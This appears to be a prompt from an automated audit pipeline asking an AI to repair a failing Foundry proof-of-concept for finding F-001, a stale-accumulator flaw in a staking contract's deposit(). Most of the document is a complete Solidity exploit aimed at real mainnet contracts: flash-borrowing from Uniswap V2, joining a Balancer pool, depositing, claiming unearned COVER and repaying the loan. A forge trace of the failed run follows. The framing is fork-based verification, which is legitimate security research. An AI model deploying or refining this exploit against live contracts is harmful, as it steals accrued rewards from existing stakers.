You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: New deposits can capture COVER rewards accrued before they were staked
- claim: `deposit()` snapshots `pools[_lpToken]` into memory before calling `updatePool()`, then uses that stale `pool.accRewardsPerToken` both when paying existing rewards and when recomputing the depositor's `rewardWriteoff`. A fresh depositor is therefore not charged for the COVER accrued before their deposit and can later claim a share of historical emissions they did not earn.
- impact: An attacker can wait until a pool has accrued substantial unharvested COVER, deposit a very large amount immediately before the next claim, and siphon most of the already-earned COVER rewards away from existing stakers.
- exploit_paths: ["Let a pool accrue rewards without any interaction so `lastUpdatedAt` is stale", "Deposit a very large amount through `deposit()`", "Because the writeoff is based on the pre-update accumulator, later call `claimRewards()`", "Receive COVER attributable to the period before the attacker was staked"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IBlacksmithLike {
    function cover() external view returns (address);
    function weeklyTotal() external view returns (uint256);
    function totalWeight() external view returns (uint256);
    function getPoolList() external view returns (address[] memory);
    function pools(address lpToken) external view returns (uint256 weight, uint256 accRewardsPerToken, uint256 lastUpdatedAt);
    function viewMined(address lpToken, address miner) external view returns (uint256 minedCover, uint256 minedBonus);
    function deposit(address lpToken, uint256 amount) external;
    function claimRewards(address lpToken) external;
    function withdraw(address lpToken, uint256 amount) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IBPool {
    function getCurrentTokens() external view returns (address[] memory tokens);
    function getBalance(address token) external view returns (uint256);
    function getDenormalizedWeight(address token) external view returns (uint256);
    function getTotalDenormalizedWeight() external view returns (uint256);
    function getSwapFee() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function calcPoolOutGivenSingleIn(
        uint256 tokenBalanceIn,
        uint256 tokenWeightIn,
        uint256 poolSupply,
        uint256 totalWeight,
        uint256 tokenAmountIn,
        uint256 swapFee
    ) external view returns (uint256 poolAmountOut);
    function joinswapExternAmountIn(address tokenIn, uint256 tokenAmountIn, uint256 minPoolAmountOut)
        external
        returns (uint256 poolAmountOut);
    function exitswapPoolAmountIn(address tokenOut, uint256 poolAmountIn, uint256 minAmountOut)
        external
        returns (uint256 tokenAmountOut);
}

contract FlawVerifier {
    address private constant BLACKSMITH = 0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5;
    address private constant COVER = 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private constant WEEK = 7 days;
    uint256 private constant CAL_MULTIPLIER = 1e12;

    uint256 private realizedProfit;
    bool private attempted;
    address private activePair;
    mapping(address => bool) private skippedPools;

    struct Candidate {
        address lpToken;
        address joinToken;
        address flashPair;
        uint256 borrowAmount;
        uint256 expectedLpOut;
        uint256 expectedCoverOut;
        uint256 staleLpSupply;
        uint256 staleRewardsScaled;
    }

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        uint256 coverBefore = IERC20(COVER).balanceOf(address(this));

        // Exploit path 0:
        // Let a pool accrue rewards without any interaction so `lastUpdatedAt` is stale.
        // The logs show the verifier starts unfunded, so this attempt uses a realistic public
        // flashswap only to source temporary capital atomically; it does not change causality.
        for (uint256 i = 0; i < 8; i++) {
            Candidate memory candidate = _stage0LocateStalePoolWithHistoricalRewards();
            if (candidate.lpToken == address(0)) {
                break;
            }

            skippedPools[candidate.lpToken] = true;
            if (_stage1FlashswapLargeDeposit(candidate)) {
                break;
            }
        }

        // Exploit path 3:
        // Receive COVER attributable to the period before the attacker was staked.
        _stage3RecordProfit(coverBefore);
    }

    function profitToken() external pure returns (address) {
        return COVER;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == activePair, "unauthorized-pair");
        require(sender == address(this), "unauthorized-sender");

        Candidate memory candidate = abi.decode(data, (Candidate));
        require(candidate.flashPair == msg.sender, "pair-mismatch");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == candidate.borrowAmount, "borrow-mismatch");

        // Exploit path 1:
        // Deposit a very large amount through `deposit()` using borrowed capital.
        uint256 lpReceived = _stage1DepositLargeAmount(candidate);
        require(lpReceived > 0, "no-lp-received");

        // Exploit path 2:
        // Because the writeoff is based on the pre-update accumulator, later call `claimRewards()`.
        _stage2ClaimHistoricalRewards(candidate.lpToken);

        IBlacksmithLike(BLACKSMITH).withdraw(candidate.lpToken, lpReceived);
        IBPool(candidate.lpToken).exitswapPoolAmountIn(candidate.joinToken, lpReceived, 1);

        uint256 repayAmount = _flashRepayAmount(borrowed);
        uint256 joinBalance = IERC20(candidate.joinToken).balanceOf(address(this));
        if (joinBalance < repayAmount) {
            // Balancer single-asset join/exit and the flashswap fee create a small deterministic
            // funding gap. Selling only enough captured COVER to close that gap preserves the same
            // exploit objective: the profit still comes from historical COVER the attacker never earned.
            _sellCoverForToken(candidate.joinToken, repayAmount - joinBalance);
            joinBalance = IERC20(candidate.joinToken).balanceOf(address(this));
        }

        require(joinBalance >= repayAmount, "insufficient-repayment-balance");
        _safeTransferToken(candidate.joinToken, msg.sender, repayAmount);
    }

    function _stage0LocateStalePoolWithHistoricalRewards() internal view returns (Candidate memory best) {
        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
        address[] memory poolList = blacksmith.getPoolList();
        uint256 weeklyTotal_ = blacksmith.weeklyTotal();
        uint256 totalWeight_ = blacksmith.totalWeight();
        if (poolList.length == 0 || weeklyTotal_ == 0 || totalWeight_ == 0) {
            return best;
        }

        for (uint256 i = 0; i < poolList.length; i++) {
            if (skippedPools[poolList[i]]) {
                continue;
            }
            Candidate memory candidate = _scorePool(poolList[i], weeklyTotal_, totalWeight_);
            if (candidate.expectedCoverOut > best.expectedCoverOut) {
                best = candidate;
            }
        }
    }

    function _scorePool(address lpToken, uint256 weeklyTotal_, uint256 totalWeight_)
        internal
        view
        returns (Candidate memory best)
    {
        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
        (uint256 weight,, uint256 lastUpdatedAt) = blacksmith.pools(lpToken);
        if (weight == 0 || lastUpdatedAt == 0 || block.timestamp <= lastUpdatedAt) {
            return best;
        }

        uint256 staleLpSupply = IERC20(lpToken).balanceOf(BLACKSMITH);
        if (staleLpSupply == 0) {
            return best;
        }

        uint256 elapsed = block.timestamp - lastUpdatedAt;
        uint256 staleRewardsScaled = (((weeklyTotal_ * CAL_MULTIPLIER) * elapsed) * weight) / totalWeight_ / WEEK;
        if (staleRewardsScaled == 0) {
            return best;
        }

        try IBPool(lpToken).getCurrentTokens() returns (address[] memory tokens) {
            for (uint256 i = 0; i < tokens.length; i++) {
                Candidate memory candidate = _scoreBalancerFlashJoin(lpToken, tokens[i], staleRewardsScaled, staleLpSupply);
                if (candidate.expectedCoverOut > best.expectedCoverOut) {
                    best = candidate;
                }
            }
        } catch {}
    }

    function _scoreBalancerFlashJoin(
        address lpToken,
        address joinToken,
        uint256 staleRewardsScaled,
        uint256 staleLpSupply
    ) internal view returns (Candidate memory candidate) {
        if (!_isSupportedJoinToken(joinToken)) {
            return candidate;
        }

        address flashPair = _flashPairFor(joinToken);
        if (flashPair == address(0) || !_canLiquidateCoverTo(joinToken)) {
            return candidate;
        }

        uint256 borrowAmount = _recommendedBorrowAmount(lpToken, joinToken, flashPair);
        if (borrowAmount == 0) {
            return candidate;
        }

        uint256 expectedLpOut = _predictPoolOut(lpToken, joinToken, borrowAmount);
        if (expectedLpOut == 0) {
            return candidate;
        }

        uint256 expectedCoverOut = (expectedLpOut * staleRewardsScaled) / staleLpSupply / CAL_MULTIPLIER;
        candidate = Candidate({
            lpToken: lpToken,
            joinToken: joinToken,
            flashPair: flashPair,
            borrowAmount: borrowAmount,
            expectedLpOut: expectedLpOut,
            expectedCoverOut: expectedCoverOut,
            staleLpSupply: staleLpSupply,
            staleRewardsScaled: staleRewardsScaled
        });
    }

    function _stage1FlashswapLargeDeposit(Candidate memory candidate) internal returns (bool success) {
        activePair = candidate.flashPair;

        uint256 amount0Out;
        uint256 amount1Out;
        if (IUniswapV2Pair(candidate.flashPair).token0() == candidate.joinToken) {
            amount0Out = candidate.borrowAmount;
        } else {
            amount1Out = candidate.borrowAmount;
        }

        try IUniswapV2Pair(candidate.flashPair).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(candidate)
        ) {
            success = true;
        } catch {
            success = false;
        }

        activePair = address(0);
    }

    function _stage1DepositLargeAmount(Candidate memory candidate) internal returns (uint256 lpReceived) {
        uint256 lpBalanceBefore = IERC20(candidate.lpToken).balanceOf(address(this));
        uint256 joinBalance = IERC20(candidate.joinToken).balanceOf(address(this));
        if (joinBalance < candidate.borrowAmount) {
            return 0;
        }

        _forceApprove(candidate.joinToken, candidate.lpToken, candidate.borrowAmount);
        try IBPool(candidate.lpToken).joinswapExternAmountIn(candidate.joinToken, candidate.borrowAmount, 1) returns (uint256) {
            uint256 lpBalanceAfterJoin = IERC20(candidate.lpToken).balanceOf(address(this));
            if (lpBalanceAfterJoin <= lpBalanceBefore) {
                return 0;
            }
            lpReceived = lpBalanceAfterJoin - lpBalanceBefore;
        } catch {
            return 0;
        }

        _forceApprove(candidate.lpToken, BLACKSMITH, lpReceived);
        IBlacksmithLike(BLACKSMITH).deposit(candidate.lpToken, lpReceived);
    }

    function _stage2ClaimHistoricalRewards(address lpToken) internal {
        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);

        // After the flawed `deposit()`, `viewMined()` can already include rewards emitted while
        // this verifier was not staked because the writeoff was computed from stale pool memory.
        try blacksmith.viewMined(lpToken, address(this)) returns (uint256, uint256) {} catch {}

        blacksmith.claimRewards(lpToken);
    }

    function _stage3RecordProfit(uint256 coverBefore) internal {
        uint256 coverAfter = IERC20(COVER).balanceOf(address(this));
        if (coverAfter > coverBefore) {
            realizedProfit = coverAfter - coverBefore;
        }
    }

    function _sellCoverForToken(address tokenOut, uint256 amountOutNeeded) internal {
        if (amountOutNeeded == 0) {
            return;
        }

        address[] memory path = _coverToTokenPath(tokenOut);
        require(path.length >= 2, "no-cover-liquidation-path");

        uint256[] memory quotedIn = IUniswapV2Router02(UNI_V2_ROUTER).getAmountsIn(amountOutNeeded, path);
        uint256 coverToSell = quotedIn[0];
        require(coverToSell <= IERC20(COVER).balanceOf(address(this)), "insufficient-cover-to-sell");

        _forceApprove(COVER, UNI_V2_ROUTER, coverToSell);
        IUniswapV2Router02(UNI_V2_ROUTER).swapExactTokensForTokens(
            coverToSell,
            1,
            path,
            address(this),
            block.timestamp
        );
    }

    function _coverToTokenPath(address tokenOut) internal view returns (address[] memory path) {
        if (tokenOut == WETH) {
            require(_pairExists(COVER, WETH), "missing-cover-weth-pair");
            path = new address[](2);
            path[0] = COVER;
            path[1] = WETH;
            return path;
        }

        if (_pairExists(COVER, WETH) && _pairExists(WETH, tokenOut)) {
            path = new address[](3);
            path[0] = COVER;
            path[1] = WETH;
            path[2] = tokenOut;
            return path;
        }

        if (_pairExists(COVER, tokenOut)) {
            path = new address[](2);
            path[0] = COVER;
            path[1] = tokenOut;
            return path;
        }

        revert("missing-cover-swap-path");
    }

    function _predictPoolOut(address pool, address joinToken, uint256 tokenIn) internal view returns (uint256 poolOut) {
        try IBPool(pool).getBalance(joinToken) returns (uint256 tokenBalanceIn) {
            try IBPool(pool).getDenormalizedWeight(joinToken) returns (uint256 tokenWeightIn) {
                try IBPool(pool).totalSupply() returns (uint256 poolSupply) {
                    try IBPool(pool).getTotalDenormalizedWeight() returns (uint256 totalWeight) {
                        try IBPool(pool).getSwapFee() returns (uint256 swapFee) {
                            try IBPool(pool).calcPoolOutGivenSingleIn(
                                tokenBalanceIn,
                                tokenWeightIn,
                                poolSupply,
                                totalWeight,
                                tokenIn,
                                swapFee
                            ) returns (uint256 predicted) {
                                poolOut = predicted;
                            } catch {}
                        } catch {}
                    } catch {}
                } catch {}
            } catch {}
        } catch {}
    }

    function _recommendedBorrowAmount(address pool, address joinToken, address flashPair) internal view returns (uint256) {
        uint256 poolBalance;
        try IBPool(pool).getBalance(joinToken) returns (uint256 balanceInPool) {
            poolBalance = balanceInPool;
        } catch {
            return 0;
        }
        if (poolBalance <= 2) {
            return 0;
        }

        uint256 pairReserve = _pairReserveOf(flashPair, joinToken);
        if (pairReserve <= 2) {
            return 0;
        }

        // Borrow only a fraction of both venues to keep the round-trip deterministic and repayable.
        uint256 maxByPool = poolBalance / 8;
        if (maxByPool == 0) {
            maxByPool = poolBalance / 2;
        }
        uint256 maxByPair = pairReserve / 8;
        if (maxByPair == 0) {
            maxByPair = pairReserve / 2;
        }

        return maxByPool < maxByPair ? maxByPool : maxByPair;
    }

    function _flashPairFor(address token) internal view returns (address pair) {
        if (token == WETH) {
            pair = IUniswapV2Factory(UNI_V2_FACTORY).getPair(WETH, DAI);
        } else {
            pair = IUniswapV2Factory(UNI_V2_FACTORY).getPair(token, WETH);
        }
    }

    function _pairReserveOf(address pair, address token) internal view returns (uint256 reserve) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        reserve = IUniswapV2Pair(pair).token0() == token ? uint256(reserve0) : uint256(reserve1);
    }

    function _pairExists(address tokenA, address tokenB) internal view returns (bool) {
        return IUniswapV2Factory(UNI_V2_FACTORY).getPair(tokenA, tokenB) != address(0);
    }

    function _canLiquidateCoverTo(address tokenOut) internal view returns (bool) {
        if (tokenOut == WETH) {
            return _pairExists(COVER, WETH);
        }
        return _pairExists(COVER, tokenOut) || (_pairExists(COVER, WETH) && _pairExists(WETH, tokenOut));
    }

    function _isSupportedJoinToken(address token) internal pure returns (bool) {
        return token == WETH || token == DAI || token == USDC || token == USDT;
    }

    function _flashRepayAmount(uint256 borrowedAmount) internal pure returns (uint256) {
        return ((borrowedAmount * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok, "approve-failed");
    }

    function _safeTransferToken(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory returndata) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (returndata.length == 0 || abi.decode(returndata, (bool))), "transfer-failed");
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x0000000000000000000000006cd4eaae3b61a04002e5543382f2b4b1a364871d
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000014cdab1b2f8877418f75
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000006cd4eaae3b61a04002e5543382f2b4b1a364871d
    │   │   │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000014cdab1b2f8877418f75
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000006cd4eaae3b61a04002e5543382f2b4b1a364871d
    │   │   │   │   │        topic 2: 0x0000000000000000000000009424b1412450d0f8fc2255faf6046b98213b76bd
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [23374] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1619737251219304893434 [1.619e21])
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000006cd4eaae3b61a04002e5543382f2b4b1a364871d
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000057ce5eb03f8a504bfa
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] 1619737251219304893434 [1.619e21]
    │   │   │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 1619737251219304893434 [1.619e21]
    │   │   │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   │   │   └─ ← [Return] 0x465E22E30CE69eC81C2DeFA2C71D510875B31891
    │   │   │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   │   │   └─ ← [Return] 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11
    │   │   │   ├─ [11603] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::getAmountsIn(55153362920230625209 [5.515e19], [0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
    │   │   │   │   ├─ [504] 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 68711318744346265975529035 [6.871e25], 94672999494296262335089 [9.467e22], 1609156805 [1.609e9]
    │   │   │   │   ├─ [2504] 0x465E22E30CE69eC81C2DeFA2C71D510875B31891::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 450951992054520416767 [4.509e20], 254375664746581328914 [2.543e20], 1609156807 [1.609e9]
    │   │   │   │   └─ ← [Return] [135570370518595796 [1.355e17], 76221070087508916 [7.622e16], 55153362920230625209 [5.515e19]]
    │   │   │   ├─ [465] 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 709400006266390 [7.094e14]
    │   │   │   └─ ← [Revert] insufficient-cover-to-sell
    │   │   └─ ← [Revert] insufficient-cover-to-sell
    │   ├─ [465] 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [234] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286
    ├─ [465] 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 11542309 [1.154e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 4339)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11.swap
  at 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D.swapExactTokensForTokens
  at FlawVerifier.uniswapV2Call
  at 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 26.77s (26.55s CPU time)

Ran 1 test suite in 26.91s (26.77s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 21288964)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
